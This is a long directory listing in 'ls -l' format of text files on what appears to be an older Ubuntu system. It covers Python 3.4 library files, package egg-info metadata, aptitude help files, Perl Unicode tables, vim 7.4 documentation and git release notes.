-rw-r--r-- 1 root root 35366 Nov 13  2018 /usr/lib/python3.4/idlelib/NEWS.txt
-rw-r--r-- 1 root root 12761 Nov 13  2018 /usr/lib/python3.4/LICENSE.txt
-rw-r--r-- 1 root root 6635 Nov 13  2018 /usr/lib/python3.4/lib2to3/Grammar.txt
-rw-r--r-- 1 root root 793 Nov 13  2018 /usr/lib/python3.4/lib2to3/PatternGrammar.txt
-rw-r--r-- 1 root root 3 Mar 26  2015 /usr/lib/python3/dist-packages/html5lib-0.999.egg-info/requires.txt
-rw-r--r-- 1 root root 1 Mar 26  2015 /usr/lib/python3/dist-packages/html5lib-0.999.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 9 Mar 26  2015 /usr/lib/python3/dist-packages/html5lib-0.999.egg-info/top_level.txt
-rw-r--r-- 1 root root 555 May  8  2017 /usr/lib/python3/dist-packages/unattended_upgrades-0.1.egg-info/SOURCES.txt
-rw-r--r-- 1 root root 1 May  8  2017 /usr/lib/python3/dist-packages/unattended_upgrades-0.1.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 1 May  8  2017 /usr/lib/python3/dist-packages/unattended_upgrades-0.1.egg-info/top_level.txt
-rw-r--r-- 1 root root 139 Oct 10  2018 /usr/lib/python3/dist-packages/wheel-0.24.0.egg-info/requires.txt
-rw-r--r-- 1 root root 1 Oct 10  2018 /usr/lib/python3/dist-packages/wheel-0.24.0.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 107 Oct 10  2018 /usr/lib/python3/dist-packages/wheel-0.24.0.egg-info/entry_points.txt
-rw-r--r-- 1 root root 6 Oct 10  2018 /usr/lib/python3/dist-packages/wheel-0.24.0.egg-info/top_level.txt
-rw-r--r-- 1 root root 71 Mar 26  2015 /usr/lib/python3/dist-packages/setuptools-3.3.egg-info/requires.txt
-rw-r--r-- 1 root root 221 Mar 26  2015 /usr/lib/python3/dist-packages/setuptools-3.3.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 2773 Mar 26  2015 /usr/lib/python3/dist-packages/setuptools-3.3.egg-info/entry_points.txt
-rw-r--r-- 1 root root 49 Mar 26  2015 /usr/lib/python3/dist-packages/setuptools-3.3.egg-info/top_level.txt
-rw-r--r-- 1 root root 1 Sep 18  2014 /usr/lib/python3/dist-packages/language_selector-0.1.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 183 Sep 18  2014 /usr/lib/python3/dist-packages/language_selector-0.1.egg-info/entry_points.txt
-rw-r--r-- 1 root root 39 Sep 18  2014 /usr/lib/python3/dist-packages/language_selector-0.1.egg-info/top_level.txt
-rw-r--r-- 1 root root 2490 Jul  6  2014 /usr/lib/python3/dist-packages/wheel/eggnames.txt
-rw-r--r-- 1 root root 1 Mar 26  2015 /usr/lib/python3/dist-packages/chardet-2.2.1.egg-info/dependency_links.txt
-rw-r--r-- 1 root root 56 Mar 26  2015 /usr/lib/python3/dist-packages/chardet-2.2.1.egg-info/entry_points.txt
-rw-r--r-- 1 root root 8 Mar 26  2015 /usr/lib/python3/dist-packages/chardet-2.2.1.egg-info/top_level.txt
-rw-r--r-- 1 root root 8375 Feb 18  2014 /usr/share/aptitude/help-ru.txt
-rw-r--r-- 1 root root 5637 Feb 18  2014 /usr/share/aptitude/help-pt_BR.txt
-rw-r--r-- 1 root root 1605 Feb 18  2014 /usr/share/aptitude/mine-help-pt_BR.txt
-rw-r--r-- 1 root root 8354 Feb 18  2014 /usr/share/aptitude/help-uk.txt
-rw-r--r-- 1 root root 1353 Feb 18  2014 /usr/share/aptitude/mine-help-cs.txt
-rw-r--r-- 1 root root 1552 Feb 18  2014 /usr/share/aptitude/mine-help-sv.txt
-rw-r--r-- 1 root root 5425 Feb 18  2014 /usr/share/aptitude/help-sv.txt
-rw-r--r-- 1 root root 5859 Feb 18  2014 /usr/share/aptitude/help-es.txt
-rw-r--r-- 1 root root 4258 Feb 18  2014 /usr/share/aptitude/help-fr.txt
-rw-r--r-- 1 root root 1395 Feb 18  2014 /usr/share/aptitude/mine-help-fi.txt
-rw-r--r-- 1 root root 2269 Feb 18  2014 /usr/share/aptitude/help-zh_TW.txt
-rw-r--r-- 1 root root 1801 Feb 18  2014 /usr/share/aptitude/mine-help-fr.txt
-rw-r--r-- 1 root root 2840 Feb 18  2014 /usr/share/aptitude/help-eu.txt
-rw-r--r-- 1 root root 1515 Feb 18  2014 /usr/share/aptitude/mine-help-de.txt
-rw-r--r-- 1 root root 5701 Feb 18  2014 /usr/share/aptitude/help-cs.txt
-rw-r--r-- 1 root root 1640 Feb 18  2014 /usr/share/aptitude/mine-help-it.txt
-rw-r--r-- 1 root root 5685 Feb 18  2014 /usr/share/aptitude/help-de.txt
-rw-r--r-- 1 root root 1524 Feb 18  2014 /usr/share/aptitude/mine-help-pl.txt
-rw-r--r-- 1 root root 5367 Feb 18  2014 /usr/share/aptitude/help-nb.txt
-rw-r--r-- 1 root root 1514 Feb 18  2014 /usr/share/aptitude/mine-help-gl.txt
-rw-r--r-- 1 root root 1544 Feb 18  2014 /usr/share/aptitude/mine-help-sk.txt
-rw-r--r-- 1 root root 7317 Feb 18  2014 /usr/share/aptitude/help-ja.txt
-rw-r--r-- 1 root root 1591 Feb 18  2014 /usr/share/aptitude/mine-help-es.txt
-rw-r--r-- 1 root root 2698 Feb 18  2014 /usr/share/aptitude/help-tr.txt
-rw-r--r-- 1 root root 5757 Feb 18  2014 /usr/share/aptitude/help-it.txt
-rw-r--r-- 1 root root 5644 Feb 18  2014 /usr/share/aptitude/help-sk.txt
-rw-r--r-- 1 root root 5161 Feb 18  2014 /usr/share/aptitude/help.txt
-rw-r--r-- 1 root root 3498 Feb 18  2014 /usr/share/aptitude/help-fi.txt
-rw-r--r-- 1 root root 2043 Feb 18  2014 /usr/share/aptitude/mine-help-ja.txt
-rw-r--r-- 1 root root 4820 Feb 18  2014 /usr/share/aptitude/help-gl.txt
-rw-r--r-- 1 root root 5931 Feb 18  2014 /usr/share/aptitude/help-pl.txt
-rw-r--r-- 1 root root 1428 Feb 18  2014 /usr/share/aptitude/mine-help.txt
-rw-r--r-- 1 root root 5052 Feb 18  2014 /usr/share/aptitude/help-zh_CN.txt
-rw-r--r-- 1 root root 16349 Nov 20  2018 /usr/share/perl/5.18.2/unicore/SpecialCasing.txt
-rw-r--r-- 1 root root 7451 Nov 20  2018 /usr/share/perl/5.18.2/unicore/Blocks.txt
-rw-r--r-- 1 root root 16978 Nov 20  2018 /usr/share/perl/5.18.2/unicore/NamedSequences.txt
-rw-r--r-- 1 root root 52838 Nov 20  2018 /usr/share/perl/5.18.2/Unicode/Collate/keys.txt
-rw-r--r-- 1 root root 1667638 Nov 20  2018 /usr/share/perl/5.18.2/Unicode/Collate/allkeys.txt
-rw-r--r-- 1 root root 24 Jun 26  2012 /usr/share/command-not-found/priority.txt
-rw-r--r-- 1 root root 17180 Oct  6  2013 /usr/share/vim/vim74/rgb.txt
-rw-r--r-- 1 root root 1639 Nov 24  2016 /usr/share/vim/vim74/indent/README.txt
-rw-r--r-- 1 root root 869 Nov 24  2016 /usr/share/vim/vim74/ftplugin/README.txt
-rw-r--r-- 1 root root 1403 Nov 24  2016 /usr/share/vim/vim74/syntax/README.txt
-rw-r--r-- 1 root root 437 Nov 24  2016 /usr/share/vim/vim74/compiler/README.txt
-rw-r--r-- 1 root root 862 Nov 24  2016 /usr/share/vim/vim74/tutor/README.txt
-rw-r--r-- 1 root root 1079 Nov 24  2016 /usr/share/vim/vim74/tutor/README.el.cp737.txt
-rw-r--r-- 1 root root 1079 Nov 24  2016 /usr/share/vim/vim74/tutor/README.el.txt
-rw-r--r-- 1 root root 2311 Nov 24  2016 /usr/share/vim/vim74/colors/README.txt
-rw-r--r-- 1 root root 1100 Nov 24  2016 /usr/share/vim/vim74/macros/README.txt
-rw-r--r-- 1 root root 1580 Nov 24  2016 /usr/share/vim/vim74/macros/urm/README.txt
-rw-r--r-- 1 root root 1862 Nov 24  2016 /usr/share/vim/vim74/macros/maze/README.txt
-rw-r--r-- 1 root root 19303 Nov 24  2016 /usr/share/vim/vim74/macros/matchit.txt
-rw-r--r-- 1 root root 773 Nov 24  2016 /usr/share/vim/vim74/autoload/README.txt
-rw-r--r-- 1 root root 1952 Nov 24  2016 /usr/share/vim/vim74/lang/README.txt
-rw-r--r-- 1 root root 14296 Nov 24  2016 /usr/share/vim/vim74/doc/usr_22.txt
-rw-r--r-- 1 root root 20845 Nov 24  2016 /usr/share/vim/vim74/doc/usr_24.txt
-rw-r--r-- 1 root root 13256 Nov 24  2016 /usr/share/vim/vim74/doc/os_msdos.txt
-rw-r--r-- 1 root root 13794 Nov 24  2016 /usr/share/vim/vim74/doc/usr_42.txt
-rw-r--r-- 1 root root 4040 Nov 24  2016 /usr/share/vim/vim74/doc/os_mac.txt
-rw-r--r-- 1 root root 9192 Nov 24  2016 /usr/share/vim/vim74/doc/usr_toc.txt
-rw-r--r-- 1 root root 10787 Nov 24  2016 /usr/share/vim/vim74/doc/if_perl.txt
-rw-r--r-- 1 root root 331423 Nov 24  2016 /usr/share/vim/vim74/doc/eval.txt
-rw-r--r-- 1 root root 131872 Nov 24  2016 /usr/share/vim/vim74/doc/pi_netrw.txt
-rw-r--r-- 1 root root 308561 Nov 24  2016 /usr/share/vim/vim74/doc/version5.txt
-rw-r--r-- 1 root root 8656 Nov 24  2016 /usr/share/vim/vim74/doc/os_os2.txt
-rw-r--r-- 1 root root 6657 Nov 24  2016 /usr/share/vim/vim74/doc/pi_tar.txt
-rw-r--r-- 1 root root 7050 Nov 24  2016 /usr/share/vim/vim74/doc/usr_43.txt
-rw-r--r-- 1 root root 208086 Nov 24  2016 /usr/share/vim/vim74/doc/syntax.txt
-rw-r--r-- 1 root root 19904 Nov 24  2016 /usr/share/vim/vim74/doc/if_cscop.txt
-rw-r--r-- 1 root root 5832 Nov 24  2016 /usr/share/vim/vim74/doc/pi_zip.txt
-rw-r--r-- 1 root root 7396 Nov 24  2016 /usr/share/vim/vim74/doc/if_ruby.txt
-rw-r--r-- 1 root root 15746 Nov 24  2016 /usr/share/vim/vim74/doc/diff.txt
-rw-r--r-- 1 root root 12612 Nov 24  2016 /usr/share/vim/vim74/doc/usr_11.txt
-rw-r--r-- 1 root root 5714 Nov 24  2016 /usr/share/vim/vim74/doc/hebrew.txt
-rw-r--r-- 1 root root 27264 Nov 24  2016 /usr/share/vim/vim74/doc/repeat.txt
-rw-r--r-- 1 root root 674749 Nov 24  2016 /usr/share/vim/vim74/doc/version7.txt
-rw-r--r-- 1 root root 4787 Nov 24  2016 /usr/share/vim/vim74/doc/os_390.txt
-rw-r--r-- 1 root root 81820 Nov 24  2016 /usr/share/vim/vim74/doc/insert.txt
-rw-r--r-- 1 root root 30694 Nov 24  2016 /usr/share/vim/vim74/doc/ft_sql.txt
-rw-r--r-- 1 root root 5643 Nov 24  2016 /usr/share/vim/vim74/doc/debugger.txt
-rw-r--r-- 1 root root 17912 Nov 24  2016 /usr/share/vim/vim74/doc/usr_45.txt
-rw-r--r-- 1 root root 15970 Nov 24  2016 /usr/share/vim/vim74/doc/usr_07.txt
-rw-r--r-- 1 root root 82888 Nov 24  2016 /usr/share/vim/vim74/doc/usr_41.txt
-rw-r--r-- 1 root root 23487 Nov 24  2016 /usr/share/vim/vim74/doc/usr_03.txt
-rw-r--r-- 1 root root 10394 Nov 24  2016 /usr/share/vim/vim74/doc/usr_31.txt
-rw-r--r-- 1 root root 56770 Nov 24  2016 /usr/share/vim/vim74/doc/pattern.txt
-rw-r--r-- 1 root root 26203 Nov 24  2016 /usr/share/vim/vim74/doc/various.txt
-rw-r--r-- 1 root root 71085 Nov 24  2016 /usr/share/vim/vim74/doc/change.txt
-rw-r--r-- 1 root root 19082 Nov 24  2016 /usr/share/vim/vim74/doc/usr_04.txt
-rw-r--r-- 1 root root 42912 Nov 24  2016 /usr/share/vim/vim74/doc/gui.txt
-rw-r--r-- 1 root root 10310 Nov 24  2016 /usr/share/vim/vim74/doc/recover.txt
-rw-r--r-- 1 root root 20158 Nov 24  2016 /usr/share/vim/vim74/doc/usr_29.txt
-rw-r--r-- 1 root root 7182 Nov 24  2016 /usr/share/vim/vim74/doc/debug.txt
-rw-r--r-- 1 root root 8285 Nov 24  2016 /usr/share/vim/vim74/doc/remote.txt
-rw-r--r-- 1 root root 11449 Nov 24  2016 /usr/share/vim/vim74/doc/usr_09.txt
-rw-r--r-- 1 root root 23153 Nov 24  2016 /usr/share/vim/vim74/doc/fold.txt
-rw-r--r-- 1 root root 4071 Nov 24  2016 /usr/share/vim/vim74/doc/os_qnx.txt
-rw-r--r-- 1 root root 30524 Nov 24  2016 /usr/share/vim/vim74/doc/message.txt
-rw-r--r-- 1 root root 18247 Nov 24  2016 /usr/share/vim/vim74/doc/ft_ada.txt
-rw-r--r-- 1 root root 18528 Nov 24  2016 /usr/share/vim/vim74/doc/usr_02.txt
-rw-r--r-- 1 root root 23642 Nov 24  2016 /usr/share/vim/vim74/doc/filetype.txt
-rw-r--r-- 1 root root 2595 Nov 24  2016 /usr/share/vim/vim74/doc/os_unix.txt
-rw-r--r-- 1 root root 16532 Nov 24  2016 /usr/share/vim/vim74/doc/undo.txt
-rw-r--r-- 1 root root 7404 Nov 24  2016 /usr/share/vim/vim74/doc/if_ole.txt
-rw-r--r-- 1 root root 352818 Nov 24  2016 /usr/share/vim/vim74/doc/options.txt
-rw-r--r-- 1 root root 13568 Nov 24  2016 /usr/share/vim/vim74/doc/tabpage.txt
-rw-r--r-- 1 root root 23182 Nov 24  2016 /usr/share/vim/vim74/doc/usr_40.txt
-rw-r--r-- 1 root root 7733 Nov 24  2016 /usr/share/vim/vim74/doc/mlang.txt
-rw-r--r-- 1 root root 4976 Nov 24  2016 /usr/share/vim/vim74/doc/rileft.txt
-rw-r--r-- 1 root root 58261 Nov 24  2016 /usr/share/vim/vim74/doc/mbyte.txt
-rw-r--r-- 1 root root 20881 Nov 24  2016 /usr/share/vim/vim74/doc/pi_getscript.txt
-rw-r--r-- 1 root root 5373 Nov 24  2016 /usr/share/vim/vim74/doc/usr_32.txt
-rw-r--r-- 1 root root 22249 Nov 24  2016 /usr/share/vim/vim74/doc/usr_05.txt
-rw-r--r-- 1 root root 29180 Nov 24  2016 /usr/share/vim/vim74/doc/usr_10.txt
-rw-r--r-- 1 root root 16015 Nov 24  2016 /usr/share/vim/vim74/doc/usr_28.txt
-rw-r--r-- 1 root root 10937 Nov 24  2016 /usr/share/vim/vim74/doc/os_beos.txt
-rw-r--r-- 1 root root 17661 Nov 24  2016 /usr/share/vim/vim74/doc/usr_90.txt
-rw-r--r-- 1 root root 29176 Nov 24  2016 /usr/share/vim/vim74/doc/usr_44.txt
-rw-r--r-- 1 root root 61877 Nov 24  2016 /usr/share/vim/vim74/doc/digraph.txt
-rw-r--r-- 1 root root 69530 Nov 24  2016 /usr/share/vim/vim74/doc/editing.txt
-rw-r--r-- 1 root root 1402 Nov 24  2016 /usr/share/vim/vim74/doc/os_mint.txt
-rw-r--r-- 1 root root 12744 Nov 24  2016 /usr/share/vim/vim74/doc/quotes.txt
-rw-r--r-- 1 root root 31384 Nov 24  2016 /usr/share/vim/vim74/doc/os_vms.txt
-rw-r--r-- 1 root root 35929 Nov 24  2016 /usr/share/vim/vim74/doc/tagsrch.txt
-rw-r--r-- 1 root root 11645 Nov 24  2016 /usr/share/vim/vim74/doc/pi_vimball.txt
-rw-r--r-- 1 root root 323 Nov 24  2016 /usr/share/vim/vim74/doc/os_risc.txt
-rw-r--r-- 1 root root 38143 Nov 24  2016 /usr/share/vim/vim74/doc/intro.txt
-rw-r--r-- 1 root root 31646 Nov 24  2016 /usr/share/vim/vim74/doc/if_pyth.txt
-rw-r--r-- 1 root root 49248 Nov 24  2016 /usr/share/vim/vim74/doc/windows.txt
-rw-r--r-- 1 root root 7198 Nov 24  2016 /usr/share/vim/vim74/doc/sponsor.txt
-rw-r--r-- 1 root root 67641 Nov 24  2016 /usr/share/vim/vim74/doc/starting.txt
-rw-r--r-- 1 root root 3090 Nov 24  2016 /usr/share/vim/vim74/doc/russian.txt
-rw-r--r-- 1 root root 61581 Nov 24  2016 /usr/share/vim/vim74/doc/spell.txt
-rw-r--r-- 1 root root 2911 Nov 24  2016 /usr/share/vim/vim74/doc/howto.txt
-rw-r--r-- 1 root root 2269 Nov 24  2016 /usr/share/vim/vim74/doc/pi_paren.txt
-rw-r--r-- 1 root root 41137 Nov 24  2016 /usr/share/vim/vim74/doc/term.txt
-rw-r--r-- 1 root root 7253 Nov 24  2016 /usr/share/vim/vim74/doc/gui_w16.txt
-rw-r--r-- 1 root root 57141 Nov 24  2016 /usr/share/vim/vim74/doc/autocmd.txt
-rw-r--r-- 1 root root 13906 Nov 24  2016 /usr/share/vim/vim74/doc/version4.txt
-rw-r--r-- 1 root root 17722 Nov 24  2016 /usr/share/vim/vim74/doc/usr_27.txt
-rw-r--r-- 1 root root 8254 Nov 24  2016 /usr/share/vim/vim74/doc/usr_26.txt
-rw-r--r-- 1 root root 20240 Nov 24  2016 /usr/share/vim/vim74/doc/develop.txt
-rw-r--r-- 1 root root 3215 Nov 24  2016 /usr/share/vim/vim74/doc/hangulin.txt
-rw-r--r-- 1 root root 9587 Nov 24  2016 /usr/share/vim/vim74/doc/usr_06.txt
-rw-r--r-- 1 root root 11936 Nov 24  2016 /usr/share/vim/vim74/doc/arabic.txt
-rw-r--r-- 1 root root 45214 Nov 24  2016 /usr/share/vim/vim74/doc/cmdline.txt
-rw-r--r-- 1 root root 25868 Nov 24  2016 /usr/share/vim/vim74/doc/gui_x11.txt
-rw-r--r-- 1 root root 269539 Nov 24  2016 /usr/share/vim/vim74/doc/todo.txt
-rw-r--r-- 1 root root 68974 Nov 24  2016 /usr/share/vim/vim74/doc/quickref.txt
-rw-r--r-- 1 root root 60652 Nov 24  2016 /usr/share/vim/vim74/doc/quickfix.txt
-rw-r--r-- 1 root root 11962 Nov 24  2016 /usr/share/vim/vim74/doc/os_dos.txt
-rw-r--r-- 1 root root 13977 Nov 24  2016 /usr/share/vim/vim74/doc/scroll.txt
-rw-r--r-- 1 root root 1296 Nov 24  2016 /usr/share/vim/vim74/doc/pi_gzip.txt
-rw-r--r-- 1 root root 20556 Nov 24  2016 /usr/share/vim/vim74/doc/tips.txt
-rw-r--r-- 1 root root 19023 Nov 24  2016 /usr/share/vim/vim74/doc/usr_25.txt
-rw-r--r-- 1 root root 5461 Nov 24  2016 /usr/share/vim/vim74/doc/os_amiga.txt
-rw-r--r-- 1 root root 8249 Nov 24  2016 /usr/share/vim/vim74/doc/help.txt
-rw-r--r-- 1 root root 577046 Nov 24  2016 /usr/share/vim/vim74/doc/version6.txt
-rw-r--r-- 1 root root 51023 Nov 24  2016 /usr/share/vim/vim74/doc/motion.txt
-rw-r--r-- 1 root root 14025 Nov 24  2016 /usr/share/vim/vim74/doc/uganda.txt
-rw-r--r-- 1 root root 22629 Nov 24  2016 /usr/share/vim/vim74/doc/if_tcl.txt
-rw-r--r-- 1 root root 61589 Nov 24  2016 /usr/share/vim/vim74/doc/map.txt
-rw-r--r-- 1 root root 18041 Nov 24  2016 /usr/share/vim/vim74/doc/os_win32.txt
-rw-r--r-- 1 root root 42167 Nov 24  2016 /usr/share/vim/vim74/doc/vi_diff.txt
-rw-r--r-- 1 root root 21315 Nov 24  2016 /usr/share/vim/vim74/doc/gui_w32.txt
-rw-r--r-- 1 root root 7098 Nov 24  2016 /usr/share/vim/vim74/doc/usr_01.txt
-rw-r--r-- 1 root root 74103 Nov 24  2016 /usr/share/vim/vim74/doc/index.txt
-rw-r--r-- 1 root root 13687 Nov 24  2016 /usr/share/vim/vim74/doc/helphelp.txt
-rw-r--r-- 1 root root 13533 Nov 24  2016 /usr/share/vim/vim74/doc/if_lua.txt
-rw-r--r-- 1 root root 10573 Nov 24  2016 /usr/share/vim/vim74/doc/if_mzsch.txt
-rw-r--r-- 1 root root 31160 Nov 24  2016 /usr/share/vim/vim74/doc/print.txt
-rw-r--r-- 1 root root 12588 Nov 24  2016 /usr/share/vim/vim74/doc/usr_23.txt
-rw-r--r-- 1 root root 6732 Nov 24  2016 /usr/share/vim/vim74/doc/sign.txt
-rw-r--r-- 1 root root 36594 Nov 24  2016 /usr/share/vim/vim74/doc/netbeans.txt
-rw-r--r-- 1 root root 21546 Nov 24  2016 /usr/share/vim/vim74/doc/visual.txt
-rw-r--r-- 1 root root 13703 Nov 24  2016 /usr/share/vim/vim74/doc/usr_20.txt
-rw-r--r-- 1 root root 4122 Nov 24  2016 /usr/share/vim/vim74/doc/pi_spec.txt
-rw-r--r-- 1 root root 4631 Nov 24  2016 /usr/share/vim/vim74/doc/workshop.txt
-rw-r--r-- 1 root root 22652 Nov 24  2016 /usr/share/vim/vim74/doc/usr_30.txt
-rw-r--r-- 1 root root 3679 Nov 24  2016 /usr/share/vim/vim74/doc/if_sniff.txt
-rw-r--r-- 1 root root 19374 Nov 24  2016 /usr/share/vim/vim74/doc/usr_08.txt
-rw-r--r-- 1 root root 18373 Nov 24  2016 /usr/share/vim/vim74/doc/usr_21.txt
-rw-r--r-- 1 root root 38049 Nov 24  2016 /usr/share/vim/vim74/doc/indent.txt
-rw-r--r-- 1 root root 9704 Nov 24  2016 /usr/share/vim/vim74/doc/farsi.txt
-rw-r--r-- 1 root root 13419 Nov 24  2016 /usr/share/vim/vim74/doc/usr_12.txt
-rw-r--r-- 1 root root 889 Nov 24  2016 /usr/share/vim/vim74/plugin/README.txt
-rw-r--r-- 1 root root 955 Nov 24  2016 /usr/share/vim/vim74/keymap/README.txt
-rw-r--r-- 1 root root 464 Nov 27  2018 /usr/share/doc/git/contrib/convert-objects/git-convert-objects.txt
-rw-r--r-- 1 root root 2092 Nov 27  2018 /usr/share/doc/git/contrib/svn-fe/svn-fe.txt
-rw-r--r-- 1 root root 890 Nov 27  2018 /usr/share/doc/git/contrib/hg-to-git/hg-to-git.txt
-rw-r--r-- 1 root root 835 Nov 27  2018 /usr/share/doc/git/contrib/gitview/gitview.txt
-rw-r--r-- 1 root root 2584 Nov 27  2018 /usr/share/doc/git/contrib/contacts/git-contacts.txt
-rw-r--r-- 1 root root 12776 Nov 27  2018 /usr/share/doc/git/contrib/subtree/git-subtree.txt
-rw-r--r-- 1 root root 5391 Nov 27  2018 /usr/share/doc/git/contrib/examples/git-svnimport.txt
-rw-r--r-- 1 root root 1210 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.4.2.txt
-rw-r--r-- 1 root root 2086 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.2.2.txt
-rw-r--r-- 1 root root 1976 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.1.1.txt
-rw-r--r-- 1 root root 6502 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.4.txt
-rw-r--r-- 1 root root 1573 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.6.4.txt
-rw-r--r-- 1 root root 1630 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.2.txt
-rw-r--r-- 1 root root 1940 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.1.5.txt
-rw-r--r-- 1 root root 1905 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.5.1.txt
-rw-r--r-- 1 root root 3577 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.1.1.txt
-rw-r--r-- 1 root root 900 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.8.txt
-rw-r--r-- 1 root root 656 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.5.2.txt
-rw-r--r-- 1 root root 482 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.7.txt
-rw-r--r-- 1 root root 1230 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.6.1.txt
-rw-r--r-- 1 root root 219 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.1.4.txt
-rw-r--r-- 1 root root 597 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.2.1.txt
-rw-r--r-- 1 root root 1499 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.5.1.txt
-rw-r--r-- 1 root root 219 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.9.txt
-rw-r--r-- 1 root root 1245 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.4.3.txt
-rw-r--r-- 1 root root 4318 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.0.3.txt
-rw-r--r-- 1 root root 9463 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.6.txt
-rw-r--r-- 1 root root 1912 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.5.4.txt
-rw-r--r-- 1 root root 1275 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.4.txt
-rw-r--r-- 1 root root 2164 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.1.1.txt
-rw-r--r-- 1 root root 2485 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.3.txt
-rw-r--r-- 1 root root 2617 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.4.txt
-rw-r--r-- 1 root root 581 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.9.txt
-rw-r--r-- 1 root root 605 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.4.5.txt
-rw-r--r-- 1 root root 462 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.0.4.txt
-rw-r--r-- 1 root root 1639 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.3.4.txt
-rw-r--r-- 1 root root 1563 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.1.6.txt
-rw-r--r-- 1 root root 371 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.9.7.txt
-rw-r--r-- 1 root root 951 Nov 27  2018 /usr/share/doc/git/RelNotes/2.7.6.txt
-rw-r--r-- 1 root root 2014 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.0.5.txt
-rw-r--r-- 1 root root 796 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.2.3.txt
-rw-r--r-- 1 root root 305 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.5.3.txt
-rw-r--r-- 1 root root 793 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.6.1.txt
-rw-r--r-- 1 root root 2206 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.4.3.txt
-rw-r--r-- 1 root root 1466 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.5.5.txt
-rw-r--r-- 1 root root 3292 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.4.2.txt
-rw-r--r-- 1 root root 1566 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.1.3.txt
-rw-r--r-- 1 root root 1206 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.3.4.txt
-rw-r--r-- 1 root root 1101 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.5.3.txt
-rw-r--r-- 1 root root 3445 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.10.2.txt
-rw-r--r-- 1 root root 11073 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.0.txt
-rw-r--r-- 1 root root 695 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.2.2.txt
-rw-r--r-- 1 root root 6294 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.5.txt
-rw-r--r-- 1 root root 696 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.7.3.txt
-rw-r--r-- 1 root root 337 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.1.4.txt
-rw-r--r-- 1 root root 5800 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.12.1.txt
-rw-r--r-- 1 root root 7596 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.5.txt
-rw-r--r-- 1 root root 452 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.1.3.txt
-rw-r--r-- 1 root root 5336 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.12.txt
-rw-r--r-- 1 root root 688 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.2.5.txt
-rw-r--r-- 1 root root 149 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.3.2.txt
-rw-r--r-- 1 root root 1034 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.4.4.txt
-rw-r--r-- 1 root root 843 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.1.4.txt
-rw-r--r-- 1 root root 1440 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.6.txt
-rw-r--r-- 1 root root 1430 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.1.5.txt
-rw-r--r-- 1 root root 928 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.2.5.txt
-rw-r--r-- 1 root root 587 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.6.6.txt
-rw-r--r-- 1 root root 1193 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.0.6.txt
-rw-r--r-- 1 root root 1740 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.1.3.txt
-rw-r--r-- 1 root root 10322 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.1.txt
-rw-r--r-- 1 root root 1476 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.0.2.txt
-rw-r--r-- 1 root root 672 Nov 27  2018 /usr/share/doc/git/RelNotes/1.8.2.3.txt
-rw-r--r-- 1 root root 524 Nov 27  2018 /usr/share/doc/git/RelNotes/1.5.4.1.txt
-rw-r--r-- 1 root root 2271 Nov 27  2018 /usr/share/doc/git/RelNotes/1.6.3.2.txt
-rw-r--r-- 1 root root 921 Nov 27  2018 /usr/share/doc/git/RelNotes/1.7.8.4.txt
